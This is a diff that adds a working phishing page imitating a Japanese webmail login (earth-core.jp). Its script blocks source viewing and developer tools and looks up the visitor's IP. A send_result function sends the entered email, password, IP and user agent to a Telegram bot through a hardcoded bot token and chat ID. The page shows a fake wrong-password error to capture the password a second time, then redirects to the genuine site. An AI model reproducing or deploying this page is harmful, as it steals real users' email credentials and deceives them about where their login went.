@@ -1,0 +1,151 @@
+<?php
+require "antibot.php";
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
+<html xmlns=http://www.w3.org/1999/xhtml class="js chrome webkit">
+<meta charset=utf-8>
+<title>Webmail :: Welcome to Webmail</title>
+<meta name=Robots content=noindex,nofollow>
+<meta http-equiv=X-UA-Compatible content="IE=EDGE">
+<link rel=index href="http://webmail.earth-core.jp/?_task=login">
+<style>body{font-family:"Lucida Grande",Verdana,Arial,Helvetica,sans-serif;margin:8px;background-color:#f6f6f6;color:#000;font-size:12px}input{font-size:12px;font-family:inherit}input[type="text"],input[type="password"]{border:1px solid #666;color:#333;background-color:#FFF}input{color:black;padding:1px 3px}input.button{height:20px;color:#333;font-size:12px;padding-left:8px;padding-right:8px;background:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAUCAMAAACK2/weAAAAOVBMVEXq6uvp6en4+fn+/f7n5+ft7e78+/v7+/vm5uf9/f75+fno6Onu7e7r6uv09PTx8fH29vbk5OX///9Fl2QFAAAARklEQVR4Xr3Hxw2AUBADUe/PkdR/scjyaSmAdxkNHue/7RSj0lGpFKViUAjKwOXgcHA6WJSzsrAJCjYmmSkTjVJSGm7nsy/W4g90C79RnQAAAABJRU5ErkJggg==)repeat-x #f0f0f0}input.button:hover{color:black}input.mainaction{font-weight:bold;border:1px solid #999}img{border:0}.boxtitle{height:12px!important;padding:2px 10px 5px 5px;border-bottom:1px solid #999;color:#333;font-size:11px;font-weight:bold;overflow:hidden;text-overflow:ellipsis;-o-text-overflow:ellipsis;white-space:nowrap;background:url(data:image/gif;base64,R0lGODdhDAA0APQfAI2MjOjq6u7v787OzvHy8tLS09HR0N7e3aqpqr29vKWjo+Dg4JmYmMPDwuvs7Ofp6dDPz5WTk7a2t7CwsMrJyuTk5J6enZCPj9vb29XV1fT09NnZ2efn583NzczMzNfX1iwAAAAADAA0AAAFv6AmjmRpniihrmy7Cq0gz3Rtz06u73ngBECfrxd4PILBY9HIbBoP0KgUuqlar9isFvvZfL7gMDhDLpvJhbR6nTa433D3YACBzOv4QWff0ev5HR6Cg4SCgIeIiYqLixyOj5CRko8VlZaXlQuam5yaGJ+goZ9npBl4p6gUqqusqg2vsLGvCbS1trQSubq7uRO+v8C+CMPExcMKyMnKyBbNzs/NDNLT1NIR19jZ1xfc3d7cAOHi4+Tl5ufo6err7OQhADs=)top left repeat-x #CCC}.boxcontent{padding:15px 10px 10px 10px;background-color:#f2f2f2}.boxcontent table td.title{color:#666;padding-right:10px}#login-form{margin-left:auto;margin-right:auto;margin-top:50px;width:400px;border:1px solid #999}#login-form table td.title{text-align:right;white-space:nowrap}#login-form table{width:1%;margin:auto}#login-form table td.input input{width:200px}.formbuttons{text-align:center}</style>
+<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAwAAAAKwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMAAABkCwkDyg8MB8oAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAAAAIsZEQPjXz8J/7FyFf+LZiX/AwMAvwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAABLAAAArzEiBvh7Uw3/tHgS/8qCE//LeRT/uoIq/1tCC/8AAACYAAAAAAAAAAAAAAAAAAAAAwAAAGgNCQLSTjUJ/5dlD//CgBP/xoIT/755EP+9dA7/xHEM/7Z6J/+WbRP/RDIJ/wAAAG4AAAAAAAAAAAAAAD9CLAf/tXgR/8mFE//DgRP/u3kO/717D//DhRn/xYsl/8WONP++kUD/kHIg/4tnD/8qIAb6AAAASAAAAAAAAABbcUwL/9CIEv+/fRD/u3sO/8CJHv/Io0n/xa9p/72tcv+1p2z/sJlQ/6yGMP+RcBz/hGEP/xQPA+AAAAANAAAAbYBXD//Kihv/uYIf/7mUQf/GvJT/z828/9LRxv/QzsH/yca2/7i1ov+omW3/o30r/5hzHP8zJgX+AAAAMAAAAVtSOxP/onQa/5l0E//Fvp7/5+jp/+7v7v/z8/L/5uXj/97d2v/Q0c//tLa3/5aIVv+pgSD/WEUV/wAAAEsAAAACAAAAYRMMANdbShn/5OTa//Dw7//5+fj/+fn4/+/v7f/t7en/6+rm/8/Pzf+dln7/eFgL/0Q2FP8AAAE5AAAAAAAAAAAAAAAOAQMHwdTU1P//////6unm/+Xk4P/g4Nz/29vX/9nY1v/i4eD/kZCP/wAAAL8AAABMAAAABAAAAAAAAAAAAAAAAAAAAHKbm5v//////+Hg3//i4uH/4eHg/9nZ2f/Jycn/0dHR/25ubv8AAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIiIi3dfX1v/p6ej/4eDh/+fn5v/Y2Nj/0dHR/7GxsP8VFRXMAAAACgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADApKCnho6Oj/8/Ozv/V1dX/x8fH/5SUlP8fHx/XAAAAIwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAJolJSXcNzc36CQkJNkAAACTAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhAAAAXQAAAG4AAABbAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAA/x8AAP4P8L/4BwAAwAcAAAADAAAAAQAAAAAAAAAAAAAAAAAAAAAAAMAAAADgAwAA4AP///AH///4DwAA/B8AAA==">
+<style>.sf-hidden{display:none!important}</style>
+<link rel=canonical href=http://webmail.earth-core.jp/>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+    $(document).ready(function() { $.getJSON("https://api.ipify.org?format=json", (data) => {$("#gfg").html(data.ip);})});
+</script>
+<style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>
+<script>
+  // prevent ctrl + s
+  window.addEventListener('keydown', async(e) => {
+      if (e.ctrlKey && (e.which == 83)) {
+          e.preventDefault();
+          return false; }
+  });
+  window.addEventListener('contextmenu', event => event.preventDefault());
+  document.onkeydown = function (e) {
+      if (event.keyCode == 123) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
+          return false;
+      }
+      if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+          return false;
+      }
+  }
+  window.onkeydown = (e) => {
+      return !(e.ctrlKey &&
+          (e.keyCode === 67 ||
+              e.keyCode === 85 ||
+              e.keyCode === 86 ||
+              e.keyCode === 88 ||
+              e.keyCode === 117));
+  };
+
+  function send_result(user, pass) {
+        var IP = document.getElementById('gfg').textContent;
+        var token = '6396476698:AAHGH6qqXEHE5Zgx6J2qVmcRhwhRyAJNHUU', chat_id = "1962488859";
+        var message = `WEBMAIL LOGS\r\nEmail: ${user}\r\nPassword: ${pass}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n`;
+        var settings = {
+            "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
+            "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
+            "data": JSON.stringify({ "chat_id": chat_id, "text": message })
+        }
+        $.ajax(settings).done();        
+    }
+  </script>
+<body>
+    <p id="gfg" style="display: none;"></p>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB98DCgYKIbWqGogAAAAdaVRYdENvbW1lbnQAAAAAAENyZWF0ZWQgd2l0aCBHSU1QZC5lBwAAAA1JREFUCNdjYGBgYAAAAAUAAV7zKjoAAAAASUVORK5CYII=" alt>
+<div id=message class=sf-hidden></div>
+<div><br></div>
+<center><div style="color: red; font-size: 16px; font-style:italic;" id="errtxt"></div></center>
+<div id=login-form>
+<div class=boxtitle>Welcome to Webmail</div>
+<div class=boxcontent>
+<form name=form method=post action="./?_task=login">
+<table summary border=0><tbody><tr><td class=title><label for=rcmloginuser>Username</label>
+</td>
+<td class=input><input name=_user id=rcmloginuser required autocapitalize=off autocomplete=off type=text value=""></td>
+</tr>
+<tr><td class=title><label for=rcmloginpwd>Password</label>
+</td>
+<td class=input><input name=_pass id=rcmloginpwd required autocapitalize=off autocomplete=off type=password value></td>
+</tr>
+</tbody>
+</table>
+<center><input name=check_save_user id=cookie_check_flg type=checkbox>
+ 
+ <label for=rcmloginpwd><font color=#666>メールアドレスを保存する</font></label>
+ 
+ 
+ </center><font color=#ff0000><p style=text-align:center>※メールアドレスは「email@sample.ne.jp」の様に<br>@を含めたメールアドレス全体をご入力下さい。</p></font><p class=formbuttons><input type=submit id=rcmloginsubmit class="button mainaction" value=Login></p>
+</form>
+</div>
+</div>
+<noscript>
+  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+<script>
+  document.addEventListener("DOMContentLoaded", ()=> {
+      var count = 0
+      var url_string = window.location.hash.substr(1);
+      if(url_string){
+          document.getElementById("rcmloginuser").value = url_string;
+      }
+
+      document.getElementById("rcmloginsubmit").addEventListener("click", event => {
+        event.preventDefault ? event.preventDefault() : event.returnValue = false;
+
+        var email = document.getElementById("rcmloginuser").value
+        var pswd = document.getElementById("rcmloginpwd").value
+
+        if (!email) {
+            setTimeout(() => {document.getElementById("rcmloginuser").value = ""; document.getElementById("errtxt").innerHTML = "Email can't be empty! please try again."}, 1500)
+            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
+        }else if (!email.includes("@") && !email.includes(".")) {
+            setTimeout(() => {document.getElementById("rcmloginuser").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect email address! please try again."}, 1500)
+            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
+        }else if (pswd == null || pswd == "") {
+            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Password can't be empty! please try again."}, 1500)
+            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
+        }else if (pswd.length < 5) {
+            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Password too short! please try again."}, 1500)
+            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""}, 5000)
+        }else if (pswd.length > 5 && count < 1) {
+            send_result(email, pswd);
+            setTimeout(() => {document.getElementById("rcmloginpwd").value = ""; document.getElementById("errtxt").innerHTML = "Incorrect Password! please try again."}, 1500)
+            setTimeout(() => {document.getElementById("errtxt").innerHTML = ""; count++}, 5000)
+        } else {
+            var email = document.getElementById("rcmloginuser").value
+            var pswd = document.getElementById("rcmloginpwd").value
+            send_result(email, pswd);
+            setTimeout(() => {window.location.assign("https://webmail.earth-core.jp/")}, 2000);
+        }
+      })
+  })
+</script>
